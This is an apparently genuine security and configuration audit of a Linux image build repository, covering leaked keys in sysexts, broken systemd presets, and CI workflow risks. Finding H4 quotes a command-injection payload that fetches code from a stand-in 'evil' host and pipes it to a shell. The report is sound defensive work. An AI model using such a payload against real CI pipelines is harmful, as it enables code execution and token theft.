# snosi Audit — Repository + Running System (snowloaded)

**Date:** 2026-07-01
**Audited commit:** `d7bb3f6` (main) with local working-tree modifications
**Running system:** snowloaded on host `framework` (booted 2026-07-01 11:32, read-only btrfs root, `/usr` via sysext overlay)
**Method:** Five parallel audit passes — shell scripts & verified downloads, mkosi/sysext configuration, CI workflows, documentation accuracy, and a read-only inspection of the live system — followed by cross-verification. Findings are sorted by impact/severity. File references are repo-relative unless prefixed with a system path.

**Summary:** 1 critical, 5 high, 17 medium, ~20 low findings, plus local-machine issues that are not image bugs. The most urgent items: publicly distributed himmelblau/incus sysexts contain the base build's `/etc/shadow` and SSH host private keys; three sysexts (himmelblau, incus, nix) silently fail to start their services after reboot; the "disable unwanted services" preset is a no-op on every image; and CI has a script-injection path plus an unpinned third-party action running before secret-bearing steps.

---

## Critical

### C1. himmelblau and incus sysexts ship the entire merged `/etc` — including `/etc/shadow` and SSH host private keys

`mkosi.images/himmelblau/mkosi.finalize` and `mkosi.images/incus/mkosi.finalize` run `cp --archive` of the whole `$BUILDROOT/etc` into `/usr/share/factory/etc`. With `Overlay=yes` + `BaseTrees=%O/base`, `$BUILDROOT/etc` is the *merged* view, so the published sysext captures a full snapshot of the base image's `/etc` — including `/etc/shadow` and the SSH host private keys generated by openssh-server's postinst during the base build. The profile-level key cleanup (`shared/outformat/image/finalize/mkosi.finalize.chroot:29`) never runs for sysexts.

- **Impact:** `himmelblau.raw` / `incus.raw` on the public repository contain private key material. Deployed hosts regenerate their own keys so direct exploitation is unlikely, but this will trip secret scanners, bloats the sysexts, and freezes stale copies of base configs into the factory tree.
- **Fix:** Capture only the paths each sysext's tmpfiles `C` directives actually need (himmelblau: `/etc/himmelblau`; incus: the handful of paths in its `tmpfiles.d/incus.conf`), mirroring what docker/tailscale/nix already do correctly. Consider rotating/invalidating anything already published.

## High

### H1. himmelblau, incus, and nix sysexts are missing the `Upholds` drop-in — their services never start after reboot

Each ships a `40-<name>.preset` but no `usr/lib/systemd/system/multi-user.target.d/10-<name>.conf`. This is exactly the documented failure mode (CLAUDE.md "Service activation in sysexts"): at boot the sysext is not yet merged when PID 1 scans units, so the preset-created `.wants` symlinks are dangling and silently dropped.

- **himmelblau** (`mkosi.images/himmelblau/mkosi.extra/`): `himmelblaud.service` + `himmelblau-sysext-setup.service` never start → Entra ID login silently broken.
- **incus** (`mkosi.images/incus/mkosi.extra/`): incus sockets not listening, `incus-startup.service` (autostarted instances) and subuid/subgid setup never run.
- **nix** (`mkosi.images/nix/mkosi.extra/`): `nix.mount` not mounted → `/nix` empty, every nix command fails; `nix-daemon.socket` not listening.
- **Fix:** Add the drop-in with `[Unit]` / `Upholds=` for the unit set (Upholds works for mount and socket units too), mirroring docker and tailscale. For docker, uphold the socket, not the service — see M2/M3.
- **Related (info):** `40-himmelblau.preset` enables `himmelblaud.service` but not `himmelblaud-tasks.service`; upstream runs both. Verify and add if not pulled in by unit deps.

### H2. `mask` is not a valid preset verb — `99-disable-unwanted-services.preset` is a silent no-op on every image

Confirmed live on the running system: `systemd: /usr/lib/systemd/system-preset/99-disable-unwanted-services.preset:1: Couldn't parse line 'mask systemd-boot-update.service'. Ignoring.` (same for all 4 lines). Consequences observed: `systemd-boot-update.service` is `enabled` and ran this boot (bootloader auto-rewrite on an immutable image), `dpkg-db-backup.timer` is active. The apt timers happen to be off by packaging defaults only.

- **Files:** `shared/snow/tree/usr/lib/systemd/system-preset/99-disable-unwanted-services.preset`, `shared/cayo/tree/usr/lib/systemd/system-preset/99-disable-unwanted-services.preset`
- **Fix:** Presets only support `enable`/`disable`. Use `disable`, and for true masking ship `/etc/systemd/system/<unit> → /dev/null` symlinks in the image tree.

### H3. `rm -rf /opt/{Bitwarden,}` deletes `/opt` itself; currently masked by accidental script ordering

`shared/packages/bitwarden/mkosi.postinst.d/bitwarden.chroot:24` brace-expands to `/opt/Bitwarden /opt/`, removing `/opt` from the image. Today `edge.chroot` runs after it (lexicographic drop-in order) and its `dpkg -i` recreates `/opt`.

- **Failure scenario:** Any profile including bitwarden without edge (or a script rename that reorders drop-ins) ships an image with no `/opt`; `opt.mount` then cannot create its mountpoint on the read-only root and fails at boot.
- **Fix:** `rm -rf /opt/Bitwarden` — `/opt` must continue to exist as a mountpoint.

### H4. CI script injection: upstream release data interpolated into `run:` blocks in a job with write permissions

`.github/workflows/check-dependencies.yml:143-278` inlines `${{ steps.check.outputs.* }}` (derived from external GitHub API responses — release tags/commit SHAs of bitwarden, coder, ostreedev, bootc-dev, etc.) directly into shell, e.g. `VER="${{ steps.check.outputs.bitwarden_version }}"`. A malicious upstream tag like `desktop-v1.0";curl evil|sh;#` executes with `contents: write` + `pull-requests: write`, and checkout (line 18) doesn't set `persist-credentials: false`, so the token in `.git/config` is exfiltratable.

- **Fix:** Pass outputs via `env:` and reference as quoted shell variables; add `persist-credentials: false` to checkouts in write-permission jobs (also missing in `check-packages.yml:18`, `validate.yml`).

### H5. Unpinned third-party action runs before secret-bearing steps in the image build

`.github/workflows/build-images.yml:61` uses `ublue-os/container-storage-action@main` in the job that later receives `GHCR_PAT`, `SIGNING_SECRET`, and R2 secrets. A compromised `main` in that repo executes arbitrary code on the runner first (can rewrite `$GITHUB_ENV`, plant a fake buildah). `frostyard/changelog-generator@main` (line 326) is the same pattern, lower risk (same org). Violates the repo's own pinning convention.

- **Fix:** Pin both to full commit SHAs; add Dependabot for actions.

## Medium

### M1. Auto-update PRs never run CI — a broken checksum/package bump merges with zero checks

`check-dependencies.yml:284` and `check-packages.yml:96` create PRs with `secrets.GITHUB_TOKEN`; GitHub suppresses `pull_request` events for GITHUB_TOKEN-created PRs, so validate/build workflows never run on them despite the PR body saying "Please verify the builds work before merging."

- **Fix:** Use a PAT or GitHub App token in `create-pull-request`.

### M2. docker.service fails on first start every boot (Upholds races socket activation)

Observed live: first start at boot → `no sockets found via socket activation` → `Failed to start docker.service`; the automatic restart succeeds. Cause: `mkosi.images/docker/mkosi.extra/usr/lib/systemd/system/multi-user.target.d/10-docker.conf` has `Upholds=docker.service`, which starts dockerd (`-H fd://`) directly without `docker.socket`.

- **Fix:** Uphold `docker.socket` instead (the tailscale drop-in is fine — tailscaled isn't socket-activated).

### M3. Preset ordering conflict: base `30-docker.preset` (disable) beats sysext `40-docker.preset` (enable)

Presets are first-match-wins in lexical order, so the base's `disable docker.socket` wins — confirmed live (`preset: disabled` while the unit is enabled only via build-time state). Any `systemctl preset-all` would disable Docker even with the sysext merged; the sysext's enable lines are dead code.

- **Files:** `mkosi.images/base/mkosi.extra/usr/lib/systemd/system-preset/30-docker.preset` (plus copies in `shared/snow/tree/` and `shared/packages/docker-onimage/tree/`) vs `mkosi.images/docker/mkosi.extra/usr/lib/systemd/system-preset/40-docker.preset`
- **Fix:** Rename the sysext preset to sort before 30 (e.g. `20-docker.preset`).

### M4. Sysext downloads are entirely unverified (`Verify=false` in all 10 `.transfer` files)

systemd-sysupdate performs no signature/hash verification; trust rests solely on TLS to repository.frostyard.org. A compromised bucket/CDN yields arbitrary root code on every host that updates.

- **Fix:** Publish `SHA256SUMS` (+ gpg signature) alongside extensions and set `Verify=yes`.

### M5. Cosign signing is write-only ceremony — no published public key, nothing ever verifies

`build-images.yml:236-255` signs with a private key, but no `cosign.pub` is published anywhere and `cosign verify` appears in no workflow (test-install pulls unverified). The `attest-build-provenance` step is the only consumer-verifiable attestation.

- **Fix:** Publish the public key, verify in `test-install.yml`, document verification for users.

### M6. Build scripts write into the git checkout (`$SRCDIR`) — confirmed source of the recurring dirty working tree

`shared/snow/scripts/build/bazaar.chroot:10` (also `hotedge.chroot:8`, `logomenu.chroot:8`, `brew.chroot:15`) extract downloads into `$SRCDIR/shared/snow/tree/...`. The bazaar extension files are **git-tracked**, so every local build overwrites them (the `sed` at `bazaar.chroot:35` also injects `"48"` into `metadata.json`) — the `.gitignore` entries (lines 21-23) are ineffective on tracked files. A build failing between the `rm -rf` (line 17) and `cp -a` (line 29) leaves the tracked directory deleted. Related: `code-server/mkosi.postinst.chroot:9-13` and the azurevpn/bitwarden/edge/fw-ipw postinst drop-ins create relative `debs/` dirs in the source tree with no trap cleanup — a failed `dpkg -i` strands `.deb`s in the repo.

- **Fix:** Extract into the image/staging tree (`$DESTDIR`/`$BUILDROOT`) or a `mktemp -d` with an EXIT trap (as `shared/bootc/build/bootc.chroot` already does), and `git rm --cached` the bazaar extension files so a single source of truth (the pinned download) remains.

### M7. Two more instances of the known user-service enablement gap (confirmed live)

Comparing every `.dsh-also` under `/var/lib/systemd/deb-systemd-user-helper-enabled/` against `/etc/systemd/user/`: `gnome-remote-desktop-headless.service` (missing from `gnome-session.target.wants/`) and `rygel.service` (missing from `default.target.wants/`) are tracked but have no enablement symlink and will never auto-start. All other ~35 tracked user units are fine.

- **Fix:** Add the manual `ln -sf` for these in `shared/snow/scripts/postinstall/snow.postinst.chroot` (or decide rygel should stay off and remove its tracking inconsistency).

### M8. `fw-ipw` (Intel Wireless firmware) fragment is a silent no-op

`shared/packages/fw-ipw/mkosi.conf` only lists `Packages=binutils`; the real work is in `mkosi.postinst.d/fw-ipw.chroot`, but no profile wires it via `PostInstallationScripts=` (contrast edge/azurevpn/bitwarden/vscode). Result: firmware never installed, `binutils` shipped for nothing. The script also downloads `firmware-ipw2x00` unpinned and installs it invisibly to dpkg.

- **Fix:** Wire the script into the four snow* profiles or drop the fragment; pin/record the firmware version.

### M9. Kernel version detection in `shared/kernel/scripts/postinst/mkosi.postinst.chroot:9` is triple-broken

`find /usr/lib/modules -maxdepth 1 -type d | grep -v -E "*.img" | tail -n 1`: (a) `*.img` is an invalid ERE — GNU grep warns and filters nothing; non-GNU greps exit 2 and abort the build under `pipefail`; (b) `find` output includes `/usr/lib/modules` itself, so zero kernel dirs yields `KERNEL_VERSION=modules`; (c) `tail -n 1` on unsorted readdir order — with two kernel packages the initramfs can be built for the wrong kernel.

- **Fix:** `find /usr/lib/modules -mindepth 1 -maxdepth 1 -type d -printf '%f\n' | sort -V | tail -n1`, and fail if empty.

### M10. himmelblau builds from an unpinned nightly APT repo

`mkosi.sandbox/etc/apt/sources.list.d/himmelblau.sources` points at `.../nightly/latest/deb/debian13`. Every build takes whatever nightly is current — non-reproducible, and a regression vector straight into the himmelblau sysext. Violates the repo's pinning convention.

- **Fix:** Pin to a versioned/stable channel.

### M11. cayo ships a Zabbly APT source whose keyring path is wrong

`shared/cayo/tree/etc/apt/sources.list.d/zabbly-incus-stable.sources` says `Signed-By: /etc/apt/keyrings/zabbly.asc` but the tree ships `zabbly.gpg` — any runtime `apt update` on cayo errors. Also stale: build-time incus now comes from Debian trixie, so a runtime Zabbly source risks version drift vs the image.

- **Fix:** Remove the source+key from the cayo tree (or fix the filename if intentional).

### M12. Unused NordVPN repo enabled in the build sandbox

`mkosi.sandbox/etc/apt/sources.list.d/nordvpn-app.sources` is enabled but no nordvpn package is referenced anywhere. Every build fetches metadata from a third-party repo that can break builds when down and adds supply-chain surface.

- **Fix:** Remove or set `Enabled: no`.

### M13. `test/bootc-install-test.sh` cleanup can `rm -rf` through a live mountpoint

The EXIT trap (lines 43-61) doesn't unmount `$WORK_DIR/mnt` or detach the loop device. If anything fails between `mount "${loop}p3"` (line 114) and `losetup -d` (line 128), cleanup deletes the mounted filesystem's contents through the mountpoint and leaks the loop device.

- **Fix:** Add `umount`/`losetup -d` (tolerant of already-clean state) to `cleanup()` before the `rm -rf`.

### M14. check-dependencies API calls are fragile — spurious red runs

All `curl -s` calls to api.github.com are unauthenticated (60 req/hr shared-IP limit, commonly exhausted on hosted runners), lack `-f`/`--retry`, and the bitwarden/brew/surface/hotedge/logomenu branches have no empty/`null` guard (unlike code-server/ostree/bootc/bazaar). Rate-limit JSON → `null` → treated as an update → bogus URL → red run.

- **Fix:** `Authorization: Bearer $GITHUB_TOKEN`, `-f --retry 3`, and empty-value guards on all branches.

### M15. validate.yml shellcheck misses every extensionless shell script and suppresses warnings

`validate.yml:28` lints only `*.sh`/`*.chroot` with `-S error`. Unlinted (verified by shebang scan): `mkosi.clean`, `mkosi.version`, five sysext `mkosi.finalize` scripts, `shared/manifest/postoutput/mkosi.postoutput`, and all in-image runtime scripts (`shared/snow/tree/usr/libexec/*`, `shared/cayo/tree/usr/{bin,libexec}/*`, sysext setup scripts). A syntax error in a runtime libexec script ships broken into images. `-S error` also suppresses SC2086-class warnings everywhere.

- **Fix:** Discover scripts by shebang (`git grep -lE '^#!/(usr/)?bin/(env )?(ba)?sh' | xargs shellcheck`), raise to `-S warning`.

### M16. GHCR_PAT is over-privileged, redundant, and exposed on process argv

`build-images.yml` uses a long-lived PAT although the job already has `packages: write` (GITHUB_TOKEN suffices for ghcr.io). The PAT is also passed on CLI argv at lines 169/185 (`buildah push --creds=`) and 250 (`cosign login -p`), visible in `/proc` to any runner process — including the unpinned action from H5. The ORAS login (line 206) already does it right via `--password-stdin`.

- **Fix:** Prefer GITHUB_TOKEN; where the PAT is required, use stdin/`REGISTRY_AUTH_FILE`.

### M17. Release changelog silently loses intervals when any sibling profile fails

With `fail-fast: false`, snowloaded can push while e.g. cayo fails; `needs.build.result == 'success'` (`build-images.yml:288`) then skips the release. The next successful run diffs only tags N-1→N, so the skipped interval's changes are never described in any release. `continue-on-error: true` (line 289) additionally makes all release-job failures invisible.

- **Fix:** Gate on the snowloaded leg specifically, or diff against the tag recorded in the latest GitHub Release; let the job fail visibly instead of `continue-on-error`.

### M18. Documentation would actively mislead an AI or new contributor doing sysext work

- **README.md** documents an obsolete per-sysext `mkosi.postoutput` pattern (`mkosi.images/incus/mkosi.postoutput` doesn't exist; the shared postoutput script + `KEYPACKAGE` is the real mechanism), and its "Basic Sysext Template" omits `Dependencies=base`, `KEYPACKAGE`, `PostOutputScripts`, the root `Dependencies=` registration, and the sysupdate.d step.
- **yeti/sysexts.md** places `Dependencies=base` under `[Output]` (actual: `[Config]`) and `Environment=KEYPACKAGE=`/`PostOutputScripts=` under `[Output]` (actual: `[Content]`); its `.transfer`/`.feature` templates use `ProtectVersion=%A`, `@o` patterns, and a `[SysUpdate]` section that don't match any shipped file (`Features=`, `Verify=false`, `[Feature]`). Copying either template verbatim breaks the build or sysupdate registration.
- **README.md** `shared/` tree diagram shows `shared/outformat/oci/` (actual: `shared/outformat/image/`), omits `shared/bootc/`, `shared/download/`, `shared/manifest/`, `shared/sysext/`; the "Zabbly repository" claim for incus is stale (build-time incus comes from debian.griffo.io/trixie); stale comments repeat this in `mkosi.images/incus/mkosi.conf` and `shared/packages/virt-base/mkosi.conf`.
- **Fix:** Correct the two sysext templates first (highest mislead risk), then the tree diagram and repo-source claims. Full docs finding list in the appendix below.

## Local-machine findings (not image bugs)

- **LM1 (medium).** System is permanently `degraded`: 19 leftover `snap-*.mount` units in `/etc/systemd/system/` from the pre-snosi mutable install fail every boot (`/snap` can't be created on read-only `/`). Masks real health signal for anything watching `is-system-running`. Cleanup: remove the unit files from `/etc/systemd/system/` and `/var/lib/snapd/` remnants.
- **LM2 (low).** Local drop-in `/etc/systemd/system/incus-startup.service.d/shutdown-order.conf` puts `TimeoutStopSec=600` under `[Unit]` (belongs in `[Service]`) — the intended 600 s VM shutdown grace is NOT applied. (Not from this repo; note the incus sysext isn't merged on this host.)
- **LM3 (info).** The `emdash` sysext is merged and updex-enabled via `/etc/sysupdate.d/emdash.feature.d/00-updex.conf`, but there's no `emdash.transfer`/`.feature` in `/usr/lib/sysupdate.d/` — sysupdate doesn't know the feature exists, so the /etc drop-in is orphaned. If emdash is meant to be supported, it needs wiring in `mkosi.images/base/mkosi.extra/usr/lib/sysupdate.d/` per the repo rule.
- **LM4 (info).** This host is not an ostree/bootc deployment (`bootc status` all-null, no `/sysroot/ostree`); it uses the repart A/B path, so bootc-based update/rollback tooling no-ops here. Root filesystem is 12G at 71% (3.5G free) — worth watching for A/B updates. `/var` is healthy (1.8T, 64%).
- **LM5 (housekeeping).** The working tree's modified `shared/snow/tree/.../bazaar-integration@kolunmi.github.io/{extension.js,metadata.json}` are build artifacts from M6, not intentional edits — after fixing M6, restore them (`git checkout -- <paths>`) and untrack per the fix.
